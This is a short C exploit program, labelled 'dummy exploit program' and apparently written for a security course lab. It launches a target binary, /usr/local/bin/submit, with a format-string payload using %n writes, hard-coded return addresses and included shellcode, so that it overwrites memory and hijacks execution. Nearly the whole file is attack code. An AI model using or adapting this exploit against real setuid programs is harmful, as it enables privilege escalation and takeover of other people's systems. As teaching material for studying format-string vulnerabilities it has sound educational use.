/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/submit"
#define NAME "\x0c\xde\xbf\xff\x0e\xde\xbf\xff" 

#define HACK "%105$.57272x%105$hn%105$.8199u%106$hn     "
int main(void)
{
  char *args[4];
  char *env[1];
  args[0] = NAME;
  args[1] = HACK;
  args[2] = shellcode;
  args[3] = NULL;

  env[0] = NULL;

  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");

  exit(0);
}
